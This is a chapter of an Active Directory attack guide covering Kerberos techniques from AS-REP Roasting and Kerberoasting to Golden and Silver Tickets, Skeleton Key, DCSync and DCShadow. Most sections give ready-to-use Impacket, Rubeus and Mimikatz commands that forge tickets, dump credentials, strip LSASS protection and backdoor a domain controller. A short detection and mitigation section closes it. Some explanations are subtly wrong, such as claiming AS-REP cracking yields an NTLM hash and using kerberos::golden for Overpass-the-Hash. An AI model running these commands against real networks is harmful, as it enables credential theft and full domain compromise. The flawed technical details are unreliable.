# Chapter 7: Kerberos Attacks

Kerberos is the default authentication protocol in Active Directory. While it is more secure than NTLM (as it does not transmit passwords over the network), it has its own set of vulnerabilities that attackers frequently exploit. This chapter details the most common and impactful Kerberos-based attacks.

## AS-REP Roasting

AS-REP Roasting targets users who have the "Do not require Kerberos preauthentication" attribute set.

### How it works
- When a user has this attribute set, they can request a Ticket Granting Ticket (TGT) without providing proof of their identity (pre-authentication).
- The Domain Controller responds with a TGT encrypted with the user's NTLM hash.
- An attacker can request TGTs for these users and attempt to crack the encrypted TGT offline to recover the NTLM hash.

### Example using Impacket (GetNPUsers.py)

```bash
# Using Impacket
python3 GetNPUsers.py -dc-ip <DomainController> -request -outputfile hashes.txt <Domain>/<Username> -no-pass
```

### Example using Rubeus

```powershell
# PowerShell
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

## Kerberoasting

Kerberoasting targets Service Principal Names (SPNs). Any domain user can request a Service Ticket (ST) for any service with an SPN.

### How it works
- The attacker requests an ST for a target service account (e.g., `MSSQLSvc/db01.contoso.com`).
- The Domain Controller issues an ST encrypted with the service account's NTLM hash.
- The attacker captures the ST and attempts to crack it offline to recover the service account's password.

### Example using Impacket (GetUserSPNs.py)

```bash
# Using Impacket
python3 GetUserSPNs.py -request -dc-ip <DomainController> -outputfile hashes.txt <Domain>/<Username>:<Password>
```

### Example using Rubeus

```powershell
# PowerShell
Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt
```

## Golden Ticket

A Golden Ticket is a forged Ticket Granting Ticket (TGT) created by an attacker who has compromised the KRBTGT account's NTLM hash.

### How it works
- The KRBTGT account is used by the Domain Controller to encrypt TGTs.
- If an attacker has the KRBTGT hash, they can create a valid TGT for any user, with any privileges (e.g., Domain Admin), and set the ticket lifetime to 10 years.
- This provides persistent, undetectable access to the entire domain.

### Example using Mimikatz

```text
# Mimikatz (requires KRBTGT hash and Domain SID)
mimikatz # kerberos::golden /user:<Username> /domain:<Domain> /sid:<DomainSID> /krbtgt:<KRBTGT_Hash> /id:500 /ptt
```

### Example using Ticketer.py (Impacket)

```bash
# Using Impacket
python3 ticketer.py -nthash <KRBTGT_Hash> -domain-sid <DomainSID> -domain <Domain> -spn cifs/<DomainController> <Username>
```

## Silver Ticket

A Silver Ticket is a forged Service Ticket (ST) created by an attacker who has compromised a specific service account's NTLM hash.

### How it works
- Unlike a Golden Ticket, a Silver Ticket only grants access to the specific service associated with the compromised hash (e.g., CIFS, HTTP, MSSQL).
- It does not require interaction with the Domain Controller, making it stealthier.

### Example using Mimikatz

```text
# Mimikatz (requires service account hash and Domain SID)
mimikatz # kerberos::golden /user:<Username> /domain:<Domain> /sid:<DomainSID> /target:<TargetServer> /service:cifs /rc4:<ServiceHash> /ptt
```

## Diamond Ticket

A Diamond Ticket is a hybrid attack that combines elements of Golden and Silver Tickets.

### How it works
- The attacker requests a valid TGT from the DC.
- They decrypt it, modify the PAC (Privilege Attribute Certificate) to elevate privileges (e.g., add Domain Admin SID).
- They re-encrypt the TGT using the KRBTGT hash and present it to the DC.
- The DC validates the ticket as legitimate because it was signed with the correct KRBTGT hash.

## Sapphire Ticket

Similar to the Diamond Ticket, the Sapphire Ticket is a more advanced variation that involves requesting a valid TGT, modifying it, and re-encrypting it. It is designed to bypass certain detection mechanisms associated with traditional Golden Tickets.

## Overpass-the-Hash

Overpass-the-Hash allows an attacker to request a Kerberos TGT using a user's NTLM hash, without knowing the plaintext password.

### Example using Mimikatz

```text
# Mimikatz
mimikatz # sekurlsa::logonpasswords
mimikatz # kerberos::ptt <TGT_File>
# Or directly:
mimikatz # kerberos::golden /user:<Username> /domain:<Domain> /sid:<DomainSID> /aes256:<AES256_Hash> /id:500 /ptt
```

### Example using Rubeus

```powershell
# PowerShell
Rubeus.exe asktgt /user:<Username> /rc4:<NTLM_Hash> /domain:<Domain> /dc:<DomainController> /ptt
```

## Pass-the-Ticket

Pass-the-Ticket involves stealing a valid Kerberos ticket (TGT or ST) from one machine and using it on another machine to authenticate.

### Example using Mimikatz

```text
# Mimikatz (export tickets)
mimikatz # sekurlsa::tickets /export
# Mimikatz (import tickets on target)
mimikatz # kerberos::ptt <Ticket_File>
```

## Skeleton Key

The Skeleton Key attack involves injecting a backdoor into the LSASS process on a Domain Controller, allowing any user to authenticate using a master password (the skeleton key) in addition to their real password.

### Example using Mimikatz

```text
# Mimikatz (requires Domain Admin privileges on DC)
mimikatz # privilege::debug
mimikatz # misc::skeleton
```

## DCSync

DCSync is a technique that simulates the behavior of a Domain Controller to replicate credentials from another Domain Controller. It requires specific privileges (DS-Replication-Get-Changes, DS-Replication-Get-Changes-All).

### Example using Mimikatz

```text
# Mimikatz
mimikatz # lsadump::dcsync /domain:<Domain> /user:<TargetUser>
```

### Example using secretsdump.py (Impacket)

```bash
# Using Impacket
python3 secretsdump.py <Domain>/<User>:<Password>@<DomainController>
```

## DCShadow

DCShadow allows an attacker to temporarily register a rogue Domain Controller to push malicious changes to the Active Directory database (e.g., modifying user attributes, injecting Golden Tickets).

### Example using Mimikatz

```text
# Mimikatz (requires Domain Admin and Schema Admin privileges)
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /remove
mimikatz # lsadump::dcshadow /object:<TargetUser> /attribute:userAccountControl /value:544
```

## Detection and Mitigation

### Detection
- **Golden/Silver Tickets**: Look for anomalous TGT/ST lifetimes, non-existent users requesting tickets, or unusual service requests.
- **Kerberoasting**: Monitor for excessive TGS-REQ requests for SPNs.
- **AS-REP Roasting**: Monitor for AS-REQ requests without pre-authentication.
- **DCSync**: Look for Event ID 4662 on Domain Controllers with `ObjectType` related to DRS replication.

### Mitigation
- **Golden/Silver Tickets**: Reset the KRBTGT account password twice. Rotate service account passwords regularly.
- **Kerberoasting**: Enforce strong, complex passwords for service accounts. Use Managed Service Accounts (MSAs) or Group Managed Service Accounts (gMSAs).
- **AS-REP Roasting**: Ensure "Do not require Kerberos preauthentication" is disabled for all users.
- **DCSync/DCShadow**: Restrict delegation of replication permissions. Monitor privileged access closely.

---
*Kerberos attacks provide deep, persistent access. The next chapter will explore NTLM-based attacks, which are often used for initial access and lateral movement.*
